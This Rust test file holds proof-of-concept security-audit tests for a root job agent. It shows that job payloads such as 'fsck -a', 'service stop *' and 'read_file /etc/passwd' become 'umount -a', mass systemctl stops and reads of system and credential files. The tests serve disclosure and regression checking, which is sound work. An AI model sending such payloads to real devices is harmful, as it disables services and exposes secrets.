//! Proof-of-concept tests for what a job document can make the root
//! `orb-jobs-agent` do. The agent applies no device-side allow-list to the
//! job payload: handler arguments are split on spaces and placed verbatim into
//! privileged argv vectors or filesystem calls.
//!
//! The tests assert the *current* behaviour so they pass today and fail once
//! the handlers validate their inputs. See `SECURITY_AUDIT_FINDINGS.md` at the
//! repository root.
//!
//! Note: the fixture needs a loopback TCP port picker that works on IPv6; on
//! IPv4-only hosts run with a patched `portpicker` (see the findings doc).

use std::{
    process::Stdio,
    sync::{Arc, Mutex},
};

use color_eyre::Result;
use common::fixture::JobAgentFixture;
use orb_jobs_agent::shell::{Host, Shell};
use orb_relay_messages::{jobs::v1::JobExecutionStatus, tonic::async_trait};
use tokio::process::{Child, Command};

mod common;

/// A `Shell` that records every argv it is asked to run and executes `true`
/// instead, so we can observe exactly what would have been spawned as root.
#[derive(Debug, Clone, Default)]
struct RecordingShell {
    calls: Arc<Mutex<Vec<Vec<String>>>>,
}

impl RecordingShell {
    fn calls(&self) -> Vec<Vec<String>> {
        self.calls.lock().unwrap().clone()
    }
}

#[async_trait]
impl Shell for RecordingShell {
    async fn exec(&self, cmd: &[&str]) -> Result<Child> {
        self.calls
            .lock()
            .unwrap()
            .push(cmd.iter().map(|s| s.to_string()).collect());
        Ok(Command::new("true")
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?)
    }
}

/// J3: `fsck <device>` places the untrusted token where `umount` and `fsck`
/// parse options. `fsck -a` therefore becomes `umount -a` (unmount everything
/// that can be unmounted) followed by `fsck -y -f -a` (walk `/etc/fstab`).
#[tokio::test(flavor = "multi_thread", worker_threads = 1)]
async fn poc_j3_fsck_option_injection() {
    let fx = JobAgentFixture::new().await;
    let shell = RecordingShell::default();
    fx.program().shell(shell.clone()).spawn().await;

    fx.enqueue_job("fsck -a").await.wait_for_completion().await;

    let calls = shell.calls();
    assert!(
        calls.contains(&vec!["umount".to_string(), "-a".to_string()]),
        "VULNERABLE: job payload became `umount -a`; calls: {calls:?}"
    );
    assert!(
        calls.contains(&vec![
            "fsck".to_string(),
            "-y".to_string(),
            "-f".to_string(),
            "-a".to_string()
        ]),
        "VULNERABLE: job payload became `fsck -y -f -a`; calls: {calls:?}"
    );
}

/// J3: `service <action> <unit>` accepts any unit name, including systemd
/// glob patterns, so `service stop *` stops every loaded unit on the device.
#[tokio::test(flavor = "multi_thread", worker_threads = 1)]
async fn poc_j3_service_accepts_glob_and_arbitrary_units() {
    let fx = JobAgentFixture::new().await;
    let shell = RecordingShell::default();
    fx.program().shell(shell.clone()).spawn().await;

    fx.enqueue_job("service stop *")
        .await
        .wait_for_completion()
        .await;
    fx.enqueue_job("service stop worldcoin-attest.service")
        .await
        .wait_for_completion()
        .await;

    let calls = shell.calls();
    for unit in ["*", "worldcoin-attest.service"] {
        assert!(
            calls.contains(&vec![
                "systemctl".to_string(),
                "stop".to_string(),
                unit.to_string()
            ]),
            "VULNERABLE: `systemctl stop {unit}` was spawned; calls: {calls:?}"
        );
    }
}

/// J1: `read_file <path>` reads any path the daemon (root) can open and ships
/// it back to the backend. There is no allow-list, so system files, keys,
/// NetworkManager keyfiles with PSKs and `/proc/*/environ` are all readable.
#[tokio::test(flavor = "multi_thread", worker_threads = 1)]
async fn poc_j1_read_file_has_no_allowlist() {
    let fx = JobAgentFixture::new().await;
    fx.program().shell(Host).spawn().await;

    fx.enqueue_job("read_file /etc/passwd")
        .await
        .wait_for_completion()
        .await;

    let updates = fx.execution_updates.read().await;
    let last = updates.last().unwrap();
    assert_eq!(last.status, JobExecutionStatus::Succeeded as i32);
    assert!(
        last.std_out.contains("root:"),
        "VULNERABLE: /etc/passwd contents were returned to the backend"
    );
}
